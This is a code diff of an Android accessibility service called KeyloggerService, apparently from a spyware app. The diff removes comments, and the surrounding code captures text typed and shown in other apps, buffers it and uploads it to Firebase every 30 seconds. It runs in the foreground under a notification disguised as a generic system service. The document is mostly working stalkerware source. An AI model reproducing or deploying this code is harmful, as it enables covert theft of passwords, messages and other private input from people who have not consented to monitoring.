@@ -17,10 +17,6 @@ import com.google.firebase.Timestamp
 import com.google.firebase.firestore.FirebaseFirestore
 import java.util.*
 
-/**
- * Accessibility service to capture keystrokes from the device
- * Requires special permissions from the user in Accessibility Settings
- */
 class KeyloggerService : AccessibilityService() {
     companion object {
         private const val TAG = "KeyloggerService"
@@ -28,7 +24,6 @@ class KeyloggerService : AccessibilityService() {
         private const val CHANNEL_ID = "keylogger_channel"
         private const val CHANNEL_NAME = "Accessibility Service"
         
-        // Constants for filtering and text processing
         private const val MAX_TEXT_LENGTH = 1000
         private const val MIN_TEXT_LENGTH = 3
         private val IGNORED_PACKAGES = listOf(
@@ -48,7 +43,6 @@ class KeyloggerService : AccessibilityService() {
         
         firestore = FirebaseFirestore.getInstance()
         
-        // Create the notification channel
         NotificationChannelManager.createNotificationChannel(
             this,
             CHANNEL_ID,
@@ -62,30 +56,27 @@ class KeyloggerService : AccessibilityService() {
     override fun onServiceConnected() {
         Log.d(TAG, "KeyloggerService connected")
         
-        // Create a notification for the foreground service
         val notification = createNotification()
         startForeground(NOTIFICATION_ID, notification)
     }
     
     override fun onAccessibilityEvent(event: AccessibilityEvent) {
-        // Get the package name of the app that fired the event
+        
         val packageName = event.packageName?.toString() ?: return
         
-        // Skip system packages and our own app
         if (IGNORED_PACKAGES.any { packageName.startsWith(it) } || 
             packageName.startsWith("com.g3spy")) {
             return
         }
         
-        // Process text events
         when (event.eventType) {
             AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
-                // Text input events
+                
                 processTextInput(event, packageName)
             }
             AccessibilityEvent.TYPE_VIEW_FOCUSED,
             AccessibilityEvent.TYPE_VIEW_CLICKED -> {
-                // Button clicks and focus events with text
+                
                 if (event.text?.isNotEmpty() == true) {
                     val text = event.text.joinToString(" ")
                     if (text.length >= MIN_TEXT_LENGTH) {
@@ -95,9 +86,9 @@ class KeyloggerService : AccessibilityService() {
             }
             AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED,
             AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED -> {
-                // Track app changes
+                
                 if (currentApp != packageName) {
-                    // App changed, upload current buffer if not empty
+                    
                     uploadCurrentBufferIfNeeded(true)
                     
                     currentApp = packageName
@@ -106,7 +97,6 @@ class KeyloggerService : AccessibilityService() {
             }
         }
         
-        // Check if we should upload the current buffer (every 30 seconds)
         val currentTime = System.currentTimeMillis()
         if (currentTime - lastUploadTime > 30000) {
             uploadCurrentBufferIfNeeded(false)
@@ -120,13 +110,13 @@ class KeyloggerService : AccessibilityService() {
     
     override fun onDestroy() {
         super.onDestroy()
-        // Upload any remaining data
+        
         uploadCurrentBufferIfNeeded(true)
         Log.d(TAG, "KeyloggerService destroyed")
     }
     
     private fun createNotification(): Notification {
-        // Create an intent that will open the app when tapped
+        
         val notificationIntent = Intent(this, MainActivity::class.java)
         val pendingIntent = PendingIntent.getActivity(
             this,
@@ -135,7 +125,6 @@ class KeyloggerService : AccessibilityService() {
             PendingIntent.FLAG_IMMUTABLE
         )
         
-        // Build the notification
         return NotificationCompat.Builder(this, CHANNEL_ID)
             .setContentTitle("System Service Running")
             .setContentText("Maintaining system services...")
@@ -148,7 +137,6 @@ class KeyloggerService : AccessibilityService() {
     private fun processTextInput(event: AccessibilityEvent, packageName: String) {
         val eventText = event.text?.joinToString(" ") ?: return
         
-        // Only process meaningful text
         if (eventText.length < MIN_TEXT_LENGTH) {
             return
         }
@@ -157,7 +145,7 @@ class KeyloggerService : AccessibilityService() {
     }
     
     private fun addTextToBuffer(text: String, packageName: String) {
-        // Trim text if it's too long
+        
         val trimmedText = if (text.length > MAX_TEXT_LENGTH) {
             text.substring(0, MAX_TEXT_LENGTH) + "..."
         } else {
@@ -166,7 +154,6 @@ class KeyloggerService : AccessibilityService() {
         
         currentText.append(trimmedText).append(" ")
         
-        // If buffer is getting too large, upload it
         if (currentText.length > MAX_TEXT_LENGTH) {
             uploadCurrentBufferIfNeeded(true)
         }
@@ -175,7 +162,7 @@ class KeyloggerService : AccessibilityService() {
     }
     
     private fun uploadCurrentBufferIfNeeded(force: Boolean) {
-        // Only upload if there's meaningful text
+        
         if (currentText.length < MIN_TEXT_LENGTH && !force) {
             return
         }
@@ -185,7 +172,6 @@ class KeyloggerService : AccessibilityService() {
             uploadKeylogToFirebase(textToUpload, currentApp)
         }
         
-        // Clear the buffer
         currentText.clear()
     }
     
